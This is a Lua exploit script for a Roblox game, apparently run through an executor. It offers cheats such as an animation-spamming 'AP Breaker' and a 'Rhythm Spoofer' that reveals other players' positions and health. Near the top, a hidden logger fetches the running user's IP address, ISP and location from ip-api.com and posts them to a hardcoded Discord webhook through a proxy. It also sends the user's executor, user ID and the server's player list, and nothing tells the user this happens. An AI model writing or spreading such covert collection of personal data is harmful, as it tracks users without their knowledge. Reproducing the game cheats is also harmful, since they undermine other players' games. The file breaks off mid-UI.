--// Whitelist Configuration
local Whitelist = {
    "foghorn", 
    "wokennebula",
    "sparta4487"
}

--// Dependencies
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Stats = game:GetService("Stats")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")
local SoundService = game:GetService("SoundService")

local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--// Verify Whitelist Access
local isWhitelisted = false
for _, username in ipairs(Whitelist) do
    if LocalPlayer.Name:lower() == username:lower() then
        isWhitelisted = true
        break
    end
end

if not isWhitelisted then
    LocalPlayer:Kick("not on whitelisting, if you execute again without whitelisting you will be banned")
    return 
end

--// INTEGRATED COMPREHENSIVE LOGGER
task.spawn(function()
    local rawWebhookUrl = "https://discord.com/api/webhooks/1521606024786608209/oQkSrATWlFyB65624wfJJoCzW6q1n82X7NeCHC8qfoURgxHg_A3e_HXzwG6wt5NtE8pg"
    local proxyUrl = rawWebhookUrl:gsub("discord.com", "webhook.lewisakura.moe")
    
    local success, geoData = pcall(function()
        local requestMethod = http_request or request or (syn and syn.request)
        local response = requestMethod({
            Url = "http://ip-api.com/json/",
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        })
        return HttpService:JSONDecode(response.Body)
    end)
    
    local country = (success and geoData.country) or "Unknown"
    local region = (success and geoData.regionName) or "Unknown"
    local ip = (success and geoData.query) or "Hidden"
    local isp = (success and geoData.isp) or "Unknown"
    
    local allPlayers = Players:GetPlayers()
    local playerNames = {}
    for _, p in pairs(allPlayers) do table.insert(playerNames, p.Name) end
    
    local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    
    local data = {
        ["embeds"] = {{
            ["title"] = "🚀 Full Execution Log",
            ["color"] = 0x8C5DF2,
            ["fields"] = {
                {["name"] = "👤 User", ["value"] = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", ["inline"] = false},
                {["name"] = "💻 Executor", ["value"] = executorName, ["inline"] = true},
                {["name"] = "📍 Location", ["value"] = country .. ", " .. region, ["inline"] = true},
                {["name"] = "🌐 ISP/IP", ["value"] = isp .. " (" .. ip .. ")", ["inline"] = false},
                {["name"] = "🎮 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                {["name"] = "📡 Ping", ["value"] = ping .. "ms", ["inline"] = true},
                {["name"] = "👥 Server Count", ["value"] = #allPlayers .. "/50", ["inline"] = true},
                {["name"] = "📋 Player List", ["value"] = table.concat(playerNames, ", "), ["inline"] = false}
            },
            ["footer"] = { ["text"] = "Timestamp: " .. os.date("%Y-%m-%d %H:%M:%S") }
        }}
    }

    local requestMethod = http_request or request or (syn and syn.request)
    if requestMethod then
        requestMethod({
            Url = proxyUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end
end)

--==============================================================================
-- GLOBAL STATES
--==============================================================================
local APBreaker = {}
local activeStates = { RhythmSpoofer = false }

--// Animations
local ANIMS = {
    "rbxassetid://9149348937",
    "rbxassetid://10880473795",
    "rbxassetid://5778357994",
    "rbxassetid://16873988732",
    "rbxassetid://7620630583",
}

--// Settings (Dynamic Control Setup)
local PULSES_PER_SECOND = 5000
local MIN_PULSES = 1000
local MAX_PULSES = 7000

local SPEED = 7
local MIN_SPEED = 1
local MAX_SPEED = 9

local WEIGHT = 0.05
local MIN_WEIGHT = 0.01
local MAX_WEIGHT = 1.00

local FADE_TIME = 0
local PRIORITY = Enum.AnimationPriority.Idle

--// State
APBreaker.enabled = false
APBreaker.randomizerEnabled = false
APBreaker.autoCycleEnabled = false
APBreaker.rapidWeightEnabled = false
APBreaker.currentStop = nil
APBreaker.charConn = nil

--// Create Animation
local function newAnim(id)
    local anim = Instance.new("Animation")
    anim.AnimationId = id
    return anim
end

--// Main Breaker
local function runBreaker(character)
    if not character then return function() end end

    local hum = character:FindFirstChildOfClass("Humanoid")
    if not hum then return function() end end

    local animator = hum:FindFirstChildOfClass("Animator") or Instance.new("Animator", hum)
    local tracks = {}

    for _, id in ipairs(ANIMS) do
        local track = animator:LoadAnimation(newAnim(id))
        track.Priority = PRIORITY
        track:AdjustWeight(WEIGHT, 0.001)
        table.insert(tracks, track)
    end

    local running = true
    task.spawn(function()
        local nextTime = os.clock()
        while running do
            if not character.Parent then break end
            local now = os.clock()
            if now >= nextTime then
                local interval = 1 / PULSES_PER_SECOND
                nextTime += interval
                local track = tracks[math.random(1, #tracks)]
                pcall(function()
                    track:Play(FADE_TIME, 1, SPEED)
                    track:AdjustWeight(WEIGHT, 0)
                end)
            end
            task.wait()
        end
    end)

    return function()
        running = false
        for _, track in ipairs(tracks) do
            pcall(function()
                track:Stop(0)
                track:Destroy()
            end)
        end
    end
end

--// Attach Character
local function attach(character)
    if APBreaker.currentStop then
        APBreaker.currentStop()
        APBreaker.currentStop = nil
    end
    if not APBreaker.enabled then return end
    APBreaker.currentStop = runBreaker(character)
end

--// Start
function APBreaker:start()
    if self.enabled then return end
    self.enabled = true
    if not self.charConn then self.charConn = LocalPlayer.CharacterAdded:Connect(attach) end
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    attach(char)
    print("AP Breaker Enabled")
end

--// Stop
function APBreaker:stop()
    if not self.enabled then return end
    self.enabled = false
    if self.currentStop then
        self.currentStop()
        self.currentStop = nil
    end
    if self.charConn then
        self.charConn:Disconnect()
        self.charConn = nil
    end
    print("AP Breaker Disabled")
end

--==============================================================================
-- PART 2: RHYTHM SPOOFER LOGIC & CONFIG
--==============================================================================
local CONFIG = {
    DETECTION_RANGE = 1000,
    ANIMATION_ID = "rbxassetid://4746910224",
    SOUND_ID = "rbxassetid://4748402358",
    SOUND_VOLUME = 0.8,
    FADE_IN_DURATION = 0.2, 
    FADE_OUT_DURATION = 0.2, 
    SATURATION_NORMAL = 0,
    SATURATION_ACTIVE = -1.0,
    TINT_NORMAL = Color3.new(1, 1, 1),
    TINT_ACTIVE = Color3.fromRGB(217, 217, 217),
    SONAR_COLOR = Color3.fromRGB(35, 55, 70),
    SONAR_START_SIZE = 80,
    SONAR_END_SIZE = 200,
}

local rhythmActive = false
local rhythmCC = nil
local currentAnimTrack = nil
local currentSound = nil
local reverbEffect = nil
local volumeEffect = nil
local reverbLoop = nil
local pulseLoop = nil
local entityTimestamps = {}
local effectModule = nil

local function getCharacter() return LocalPlayer and LocalPlayer.Character end
local function getHRP() local c = getCharacter() return c and c:FindFirstChild("HumanoidRootPart") end
local function getHumanoid() local c = getCharacter() return c and c:FindFirstChildOfClass("Humanoid") end

local function isPlayingCrouchAnimation()
    local humanoid = getHumanoid()
    if not humanoid then return false end
    local animator = humanoid:FindFirstChildOfClass("Animator")
    if not animator then return false end
    
    for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
        local name = string.lower(track.Name)
        local animId = track.Animation and track.Animation.AnimationId or ""
        if string.find(name, "crouch") or string.find(string.lower(animId), "crouch") then
            return true
        end
    end
    return false
end

local function getEffectModule()
    if effectModule then return effectModule end
    local effectReplicator = ReplicatedStorage:FindFirstChild("EffectReplicator")
    if effectReplicator then
        local success, result = pcall(require, effectReplicator)
        if success then effectModule = result end
    end
    return effectModule
end

local function isCrouching()
    if isPlayingCrouchAnimation() then return true end
    local em = getEffectModule()
    if em then
        if em:FindEffect("ClientCrouch") or em:FindEffect("Crouching") then
            return true
        end
    end
    return false
end

local function canUseRhythm()
    if not isCrouching() then return false end
    local em = getEffectModule()
    if em and em:FindEffect("Stun") then return false end
    return true
end

local function getThrown()
    local thrown = workspace:FindFirstChild("Thrown")
    if not thrown then
        thrown = Instance.new("Folder", workspace)
        thrown.Name = "Thrown"
    end
    return thrown
end

local function setupRhythmCC()
    rhythmCC = Lighting:FindFirstChild("Rhythm")
    if not rhythmCC then
        rhythmCC = Instance.new("ColorCorrectionEffect", Lighting)
        rhythmCC.Name = "Rhythm"
        rhythmCC.Brightness = 0
        rhythmCC.Contrast = 0
        rhythmCC.Saturation = 0
        rhythmCC.TintColor = Color3.new(1, 1, 1)
        rhythmCC.Enabled = false
    end
    return rhythmCC
end

local function activateLighting()
    if not rhythmCC then setupRhythmCC() end
    rhythmCC.Saturation = CONFIG.SATURATION_NORMAL
    rhythmCC.TintColor = CONFIG.TINT_NORMAL
    rhythmCC.Enabled = true

    TweenService:Create(rhythmCC,
        TweenInfo.new(CONFIG.FADE_IN_DURATION, Enum.EasingStyle.Linear),
        { Saturation = CONFIG.SATURATION_ACTIVE, TintColor = CONFIG.TINT_ACTIVE }
    ):Play()
end

local function deactivateLighting()
    if not rhythmCC then return end
    TweenService:Create(rhythmCC,
        TweenInfo.new(CONFIG.FADE_OUT_DURATION, Enum.EasingStyle.Linear),
        { Saturation = CONFIG.SATURATION_NORMAL, TintColor = CONFIG.TINT_NORMAL }
    ):Play()
end

local function startAmbientOverride()
    local em = getEffectModule()
    if not em then return end

    if reverbEffect then pcall(function() reverbEffect:Remove() end) reverbEffect = nil end
    if volumeEffect then pcall(function() volumeEffect:Remove() end) volumeEffect = nil end
    if reverbLoop then pcall(function() reverbLoop:Disconnect() end) reverbLoop = nil end

    task.wait()
    pcall(function() reverbEffect = em:CreateEffect("ReverbOverride", {}) end)
    pcall(function() volumeEffect = em:CreateEffect("AmbientVolume", { Value = 1 }) end)

    reverbLoop = RunService.Heartbeat:Connect(function()
        if rhythmActive and SoundService.AmbientReverb ~= Enum.ReverbType.Alley then
            SoundService.AmbientReverb = Enum.ReverbType.Alley
        end
    end)

    local numberValue = Instance.new("NumberValue")
    numberValue.Value = 1
    numberValue.Changed:Connect(function()
        if volumeEffect then volumeEffect.Value = numberValue.Value end
    end)

    TweenService:Create(numberValue, TweenInfo.new(0.2), { Value = 0 }):Play()
    task.delay(0.5, function() numberValue:Destroy() end)
end

local function stopAmbientOverride(immediate)
    if reverbLoop then pcall(function() reverbLoop:Disconnect() end) reverbLoop = nil end
    local currentVolumeEffect = volumeEffect
    local currentReverbEffect = reverbEffect
    volumeEffect = nil
    reverbEffect = nil

    if currentReverbEffect then pcall(function() currentReverbEffect:Remove() end) end
    SoundService.AmbientReverb = Enum.ReverbType.NoReverb

    if not currentVolumeEffect then return end
    if immediate then pcall(function() currentVolumeEffect:Remove() end) return end

    local success, numberValue = pcall(function()
        local nv = Instance.new("NumberValue")
        nv.Value = 0
        return nv
    end)

    if success and numberValue then
        local conn
        conn = numberValue.Changed:Connect(function()
            pcall(function() currentVolumeEffect.Value = numberValue.Value end)
        end)

        TweenService:Create(numberValue, TweenInfo.new(0.2), { Value = 1 }):Play()
        task.delay(0.3, function()
            pcall(function() conn:Disconnect() end)
            pcall(function() numberValue:Destroy() end)
            pcall(function() currentVolumeEffect:Remove() end)
        end)
    else
        pcall(function() currentVolumeEffect:Remove() end)
    end
end

local function playAnimation()
    local humanoid = getHumanoid()
    if not humanoid then return end
    local animator = humanoid:FindFirstChildOfClass("Animator")
    if not animator then return end

    local listenAnim = ReplicatedStorage:FindFirstChild("Assets")
        and ReplicatedStorage.Assets:FindFirstChild("Anims")
        and ReplicatedStorage.Assets.Anims:FindFirstChild("Powers")
        and ReplicatedStorage.Assets.Anims.Powers:FindFirstChild("Listen")

    if listenAnim then
        currentAnimTrack = animator:LoadAnimation(listenAnim)
    else
        local anim = Instance.new("Animation")
        anim.AnimationId = CONFIG.ANIMATION_ID
        currentAnimTrack = animator:LoadAnimation(anim)
    end

    currentAnimTrack.Priority = Enum.AnimationPriority.Action
    currentAnimTrack:Play()
end

local function stopAnimation()
    if currentAnimTrack then currentAnimTrack:Stop() currentAnimTrack = nil end
end

local function playSound()
    local rhythmSound = ReplicatedStorage:FindFirstChild("Sounds")
        and ReplicatedStorage.Sounds:FindFirstChild("Rhythm")

    if rhythmSound then
        currentSound = rhythmSound:Clone()
    else
        currentSound = Instance.new("Sound")
        currentSound.SoundId = CONFIG.SOUND_ID
        currentSound.Volume = CONFIG.SOUND_VOLUME
    end

    currentSound.Name = "Rhythm"
    currentSound.Parent = workspace
    currentSound:Play()
    Debris:AddItem(currentSound, 3)
end

local function stopRhythm()
    if not rhythmActive then return end
    rhythmActive = false

    stopAnimation()
    currentSound = nil
    deactivateLighting()
    stopAmbientOverride()

    if pulseLoop then task.cancel(pulseLoop) pulseLoop = nil end
    task.spawn(function() task.wait(0.5) if rhythmCC then rhythmCC.Enabled = false end end)
end

local function createExpandingSonar()
    local hrp = getHRP()
    if not hrp then return end

    local part
    local sonarAsset = ReplicatedStorage:FindFirstChild("Assets")
        and ReplicatedStorage.Assets:FindFirstChild("Effects")
        and ReplicatedStorage.Assets.Effects:FindFirstChild("Sonar")

    if sonarAsset then
        part = sonarAsset:Clone()
    else
        part = Instance.new("Part")
        part.Shape = Enum.PartType.Ball
        part.Color = CONFIG.SONAR_COLOR
        part.Material = Enum.Material.ForceField
        part.Anchored = true
        part.CanCollide = false
        part.CastShadow = false
    end

    part.Name = "Sonar"
    part.Transparency = 1
    part.Size = Vector3.new(CONFIG.SONAR_START_SIZE, CONFIG.SONAR_START_SIZE, CONFIG.SONAR_START_SIZE)
    part.CFrame = hrp.CFrame
    part.Parent = getThrown()

    TweenService:Create(part, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), { Size = Vector3.new(CONFIG.SONAR_END_SIZE, CONFIG.SONAR_END_SIZE, CONFIG.SONAR_END_SIZE) }):Play()
    TweenService:Create(part, TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, true), { Transparency = 0 }):Play()
    Debris:AddItem(part, 2)
end

local function detectEntities()
    local hrp = getHRP()
    if not hrp then return end

    local character = getCharacter()
    local myPos = hrp.Position
    local range = CONFIG.DETECTION_RANGE
    local liveFolder = workspace:FindFirstChild("Live")
    if not liveFolder then return end

    local clientEffectDirect = ReplicatedStorage:FindFirstChild("Requests")
        and ReplicatedStorage.Requests:FindFirstChild("ClientEffectDirect")
    if not clientEffectDirect then return end

    for _, entity in ipairs(liveFolder:GetChildren()) do
        local entityHRP = entity:FindFirstChild("HumanoidRootPart")

        if entityHRP and entity ~= character and not entity:HasTag("InTacet") then
            if not entityTimestamps[entity.Name] then
                entityTimestamps[entity.Name] = tick()
            elseif tick() - entityTimestamps[entity.Name] >= 0.5 then 
                entityTimestamps[entity.Name] = tick()
            else
                continue
            end

            local effectiveRange = range
            if entity:HasTag("Disguised") then effectiveRange = effectiveRange * 0.1 end

            local dist = (myPos - entityHRP.Position).Magnitude
            if dist < effectiveRange then
                local color = Color3.new(1, 1, 1)
                local hum = entity:FindFirstChildOfClass("Humanoid")
                if hum and not entity:HasTag("NoVisibleDamage") then
                    local healthPercent = hum.Health / hum.MaxHealth
                    if healthPercent < 0.33 then color = Color3.fromRGB(255, 0, 0)
                    elseif healthPercent < 0.66 then color = Color3.fromRGB(255, 179, 0) end
                end

                clientEffectDirect:Fire("sonarsmall", { pos = entityHRP.Position, col = color })
            end
        end
    end
end

local function startRhythm()
    if rhythmActive then return end
    rhythmActive = true

    playAnimation()
    playSound()

    setupRhythmCC()
    activateLighting()
    startAmbientOverride()

    entityTimestamps = {}
    detectEntities()

    pulseLoop = task.spawn(function()
        while rhythmActive do
            task.wait(0.2)
            detectEntities()
        end
    end)

    for _ = 1, 5 do
        task.spawn(createExpandingSonar)
    end
end

--==============================================================================
-- PART 3: MAIN UNIFIED UI ENGINE (PURPLE THEME)
--==============================================================================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "APBreakerUI_WokenNebula"
ScreenGui.ResetOnSpawn = false
ScreenGui.Enabled = false -- Hides the GUI initially upon execution
ScreenGui.Parent = game:GetService("CoreGui")

local ClickSound = Instance.new("Sound")
ClickSound.SoundId = "rbxassetid://9114223161"
ClickSound.Volume = 0.5
ClickSound.Parent = ScreenGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 220, 0, 395) 
Frame.Position = UDim2.new(0.5, -110, 0.5, -197)
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.ClipsDescendants = true
Frame.Active = true
Frame.Draggable = true 
Frame.Parent = ScreenGui

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 14)
FrameCorner.Parent = Frame

local PurpleGradient = Instance.new("UIGradient")
PurpleGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 35, 65)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 93, 242))
}
PurpleGradient.Rotation = -90
PurpleGradient.Parent = Frame

local UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 1.5
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Transparency = 0.2
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Parent = Frame

local SwordImage = Instance.new("ImageLabel")
SwordImage.Size = UDim2.new(0, 110, 0, 110)
SwordImage.Position = UDim2.new(0.5, 0, 0.5, 0)
SwordImage.AnchorPoint = Vector2.new(0.5, 0.5)
SwordImage.BackgroundTransparency = 1
SwordImage.ScaleType = Enum.ScaleType.Fit
SwordImage.Rotation = 45
SwordImage.Image = "rbxassetid://0" 
SwordImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
SwordImage.ImageTransparency = 0.75
SwordImage.ZIndex = 1
SwordImage.Parent = Frame

local MainContent = Instance.new("Frame")
MainContent.Size = UDim2.new(0, 220, 1, 0)
MainContent.BackgroundTransparency = 1
MainContent.ZIndex = 2
MainContent.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -75, 0, 35)
Title.Position = UDim2.new(0, 15, 0, 14)
Title.BackgroundTransparency = 1
Title.Text = "WOKEN NEBULA\nAP BOOMER"
Title.TextColor3 = Color3.fromRGB(230, 215, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 11
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 3
Title.Parent = MainContent

local ActionBtn = Instance.new("TextButton")
ActionBtn.Size = UDim2.new(0, 130, 0, 30)
ActionBtn.Position = UDim2.new(0.5, -65, 0, 48)
ActionBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ActionBtn.BackgroundTransparency = 0.25
ActionBtn.Text = "BOOM"
ActionBtn.TextColor3 = Color3.fromRGB(140, 93, 242)
ActionBtn.Font = Enum.Font.GothamBold
ActionBtn.TextSize = 13
ActionBtn.AutoButtonColor = false
ActionBtn.ZIndex = 3
ActionBtn.Parent = MainContent

local ActionBtnCorner = Instance.new("UICorner")
ActionBtnCorner.CornerRadius = UDim.new(0, 8)
ActionBtnCorner.Parent = ActionBtn

local ActionBtnStroke = Instance.new("UIStroke")
ActionBtnStroke.Thickness = 1
ActionBtnStroke.Color = Color3.fromRGB(255, 255, 255)
ActionBtnStroke.Transparency = 0.4
ActionBtnStroke.Parent = ActionBtn

--// SLIDERS
local PulseSliderFrame = Instance.new("Frame")
PulseSliderFrame.Size = UDim2.new(0, 190, 0, 36)
PulseSliderFrame.Position = UDim2.new(0.5, -95, 0, 90)
PulseSliderFrame.BackgroundTransparency = 1
PulseSliderFrame.ZIndex = 3
PulseSliderFrame.Parent = MainContent

local PulseTitle = Instance.new("TextLabel")
PulseTitle.Size = UDim2.new(1, 0, 0, 14)
PulseTitle.BackgroundTransparency = 1
PulseTitle.Text = "Pulses/Sec: 5,000"
PulseTitle.TextColor3 = Color3.fromRGB(240, 230, 255)
PulseTitle.Font = Enum.Font.GothamBold
PulseTitle.TextSize = 10
PulseTitle.TextXAlignment = Enum.TextXAlignment.Left
PulseTitle.ZIndex = 4
PulseTitle.Parent = PulseSliderFrame

local PulseBar = Instance.new("TextButton")
PulseBar.Size = UDim2.new(1, 0, 0, 6)
PulseBar.Position = UDim2.new(0, 0, 0, 18)
PulseBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PulseBar.BackgroundTransparency = 0.5
PulseBar.Text = ""
PulseBar.AutoButtonColor = false
PulseBar.ZIndex = 4
PulseBar.Parent = PulseSliderFrame

local PulseBarCorner = Instance.new("UICorner")
PulseBarCorner.CornerRadius = UDim.new(1, 0)
PulseBarCorner.Parent = PulseBar

local PulseFill = Instance.new("Frame")
PulseFill.Size = UDim2.new(0.666, 0, 1, 0) 
PulseFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PulseFill.ZIndex = 5
PulseFill.Parent = PulseBar

local PulseFillCorner = Instance.new("UICorner")
PulseFillCorner.CornerRadius = UDim.new(1, 0)
PulseFillCorner.Parent = PulseFill

local PulseKnob = Instance.new("Frame")
PulseKnob.Size = UDim2.new(0, 12, 0, 12)
PulseKnob.Position = UDim2.new(0.666, -6, 0.5, -6)
PulseKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PulseKnob.ZIndex = 6
PulseKnob.Parent = PulseBar

local PulseKnobCorner = Instance.new("UICorner")
PulseKnobCorner.CornerRadius = UDim.new(1, 0)
PulseKnobCorner.Parent = PulseKnob

local PulseKnobStroke = Instance.new("UIStroke")
PulseKnobStroke.Thickness = 1.5
PulseKnobStroke.Color = Color3.fromRGB(140, 93, 242)
PulseKnobStroke.Parent = PulseKnob

local SpeedSliderFrame = Instance.new("Frame")
SpeedSliderFrame.Size = UDim2.new(0, 190, 0, 36)
SpeedSliderFrame.Position = UDim2.new(0.5, -95, 0, 132)
SpeedSliderFrame.BackgroundTransparency = 1
SpeedSliderFrame.ZIndex = 3
SpeedSliderFrame.Parent = MainContent

local SpeedTitle = Instance.new("TextLabel")
SpeedTitle.Size = UDim2.new(1, 0, 0, 14)
SpeedTitle.BackgroundTransparency = 1
SpeedTitle.Text = "Speed: 7"
SpeedTitle.TextColor3 = Color3.fromRGB(240, 230, 255)
SpeedTitle.Font = Enum.Font.GothamBold
SpeedTitle.TextSize = 10
SpeedTitle.TextXAlignment = Enum.TextXAlignment.Left
SpeedTitle.ZIndex = 4
SpeedTitle.Parent = SpeedSliderFrame

local SpeedBar = Instance.new("TextButton")
SpeedBar.Size = UDim2.new(1, 0, 0, 6)
SpeedBar.Position = UDim2.new(0, 0, 0, 18)
SpeedBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpeedBar.BackgroundTransparency = 0.5
SpeedBar.Text = ""
SpeedBar.AutoButtonColor = false
SpeedBar.ZIndex = 4
SpeedBar.Parent = SpeedSliderFrame

local SpeedBarCorner = Instance.new("UICorner")
SpeedBarCorner.CornerRadius = UDim.new(1, 0)
SpeedBarCorner.Parent = SpeedBar

local SpeedFill = Instance.new("Frame")
SpeedFill.Size = UDim2.new(0.75, 0, 1, 0) 
SpeedFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpeedFill.ZIndex = 5
SpeedFill.Parent = SpeedBar

local SpeedFillCorner = Instance.new("UICorner")
SpeedFillCorner.CornerRadius = UDim.new(1, 0)
SpeedFillCorner.Parent = SpeedFill

local SpeedKnob = Instance.new("Frame")
SpeedKnob.Size = UDim2.new(0, 12, 0, 12)
SpeedKnob.Position = UDim2.new(0.75, -6, 0.5, -6)
SpeedKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpeedKnob.ZIndex = 6
SpeedKnob.Parent = SpeedBar

local SpeedKnobCorner = Instance.new("UICorner")
SpeedKnobCorner.CornerRadius = UDim.new(1, 0)
SpeedKnobCorner.Parent = SpeedKnob

local SpeedKnobStroke = Instance.new("UIStroke")
SpeedKnobStroke.Thickness = 1.5
SpeedKnobStroke.Color = Color3.fromRGB(140, 93, 242)
SpeedKnobStroke.Parent = SpeedKnob

local WeightSliderFrame = Instance.new("Frame")
WeightSliderFrame.Size = UDim2.new(0, 190, 0, 36)
WeightSliderFrame.Position = UDim2.new(0.5, -95, 0, 174)
WeightSliderFrame.BackgroundTransparency = 1
WeightSliderFrame.ZIndex = 3
WeightSliderFrame.Parent = MainContent

local WeightTitle = Instance.new("TextLabel")
WeightTitle.Size = UDim2.new(1, 0, 0, 14)
WeightTitle.BackgroundTransparency = 1
WeightTitle.Text = "Weight: 0.05"
WeightTitle.TextColor3 = Color3.fromRGB(240, 230, 255)
WeightTitle.Font = Enum.Font.GothamBold
WeightTitle.TextSize = 10
WeightTitle.TextXAlignment = Enum.TextXAlignment.Left
WeightTitle.ZIndex = 4
WeightTitle.Parent = WeightSliderFrame

local WeightBar = Instance.new("TextButton")
WeightBar.Size = UDim2.new(1, 0, 0, 6)
WeightBar.Position = UDim2.new(0, 0, 0, 18)
WeightBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WeightBar.BackgroundTransparency = 0.5
WeightBar.Text = ""
WeightBar.AutoButtonColor = false
WeightBar.ZIndex = 4
WeightBar.Parent = WeightSliderFrame

local WeightBarCorner = Instance.new("UICorner")
WeightBarCorner.CornerRadius = UDim.new(1, 0)
WeightBarCorner.Parent = WeightBar

local WeightFill = Instance.new("Frame")
WeightFill.Size = UDim2.new(0.05, 0, 1, 0)
WeightFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WeightFill.ZIndex = 5
WeightFill.Parent = WeightBar

local WeightFillCorner = Instance.new("UICorner")
WeightFillCorner.CornerRadius = UDim.new(1, 0)
WeightFillCorner.Parent = WeightFill

local WeightKnob = Instance.new("Frame")
WeightKnob.Size = UDim2.new(0, 12, 0, 12)
WeightKnob.Position = UDim2.new(0.05, -6, 0.5, -6)
WeightKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WeightKnob.ZIndex = 6
WeightKnob.Parent = WeightBar

local WeightKnobCorner = Instance.new("UICorner")
WeightKnobCorner.CornerRadius = UDim.new(1, 0)
WeightKnobCorner.Parent = WeightKnob

local WeightKnobStroke = Instance.new("UIStroke")
WeightKnobStroke.Thickness = 1.5
WeightKnobStroke.Color = Color3.fromRGB(140, 93, 242)
WeightKnobStroke.Parent = WeightKnob

--// AP BOOMER BUTTONS
local RandBtn = Instance.new("TextButton")
RandBtn.Size = UDim2.new(0, 190, 0, 26)
RandBtn.Position = UDim2.new(0.5, -95, 0, 216)
RandBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RandBtn.BackgroundTransparency = 0.4
RandBtn.Text = "RANDOMIZER: OFF"
RandBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RandBtn.Font = Enum.Font.GothamBold
RandBtn.TextSize = 10
RandBtn.AutoButtonColor = false
RandBtn.ZIndex = 3
RandBtn.Parent = MainContent

local RandBtnCorner = Instance.new("UICorner")
RandBtnCorner.CornerRadius = UDim.new(0, 6)
RandBtnCorner.Parent = RandBtn

local RandBtnStroke = Instance.new("UIStroke")
RandBtnStroke.Thickness = 1
RandBtnStroke.Color = Color3.fromRGB(255, 255, 255)
RandBtnStroke.Transparency = 0.6
RandBtnStroke.Parent = RandBtn

local AutoBtn = Instance.new("TextButton")
AutoBtn.Size = UDim2.new(0, 190, 0, 26)
AutoBtn.Position = UDim2.new(0.5, -95, 0, 248)
AutoBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoBtn.BackgroundTransparency = 0.4
AutoBtn.Text = "AUTO-CYCLE (0.5s): OFF"
AutoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoBtn.Font = Enum.Font.GothamBold
AutoBtn.TextSize = 10
AutoBtn.AutoButtonColor = false
AutoBtn.ZIndex = 3
AutoBtn.Parent = MainContent

local AutoBtnCorner = Instance.new("UICorner")
AutoBtnCorner.CornerRadius = UDim.new(0, 6)
AutoBtnCorner.Parent = AutoBtn

local AutoBtnStroke = Instance.new("UIStroke")
AutoBtnStroke.Thickness = 1
AutoBtnStroke.Color = Color3.fromRGB(255, 255, 255)
AutoBtnStroke.Transparency = 0.6
AutoBtnStroke.Parent = AutoBtn

local RapidWeightBtn = Instance.new("TextButton")
RapidWeightBtn.Size = UDim2.new(0, 190, 0, 26)
RapidWeightBtn.Position = UDim2.new(0.5, -95, 0, 280)
RapidWeightBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RapidWeightBtn.BackgroundTransparency = 0.4
RapidWeightBtn.Text = "RAPID WEIGHT: OFF"
RapidWeightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
RapidWeightBtn.Font = Enum.Font.GothamBold
RapidWeightBtn.TextSize = 10
RapidWeightBtn.AutoButtonColor = false
RapidWeightBtn.ZIndex = 3
RapidWeightBtn.Parent = MainContent

local RapidWeightBtnCorner = Instance.new("UICorner")
RapidWeightBtnCorner.CornerRadius = UDim.new(0, 6)
RapidWeightBtnCorner.Parent = RapidWeightBtn

local RapidWeightBtnStroke = Instance.new("UIStroke")
RapidWeightBtnStroke.Thickness = 1
RapidWeightBtnStroke.Color = Color3.fromRGB(255, 255, 255)
RapidWeightBtnStroke.Transparency = 0.6
RapidWeightBtnStroke.Parent = RapidWeightBtn

--// INTEGRATED RHYTHM SPOOFER TOGGLE BUTTON
local RhythmBtn = Instance.new("TextButton")
RhythmBtn.Size = UDim2.new(0, 190, 0, 26)
RhythmBtn.Position = UDim2.new(0.5, -95, 0, 312)
RhythmBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RhythmBtn.BackgroundTransparency = 0.4
RhythmBtn.Text = "RHYTHM SPOOFER [G]: OFF"
RhythmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
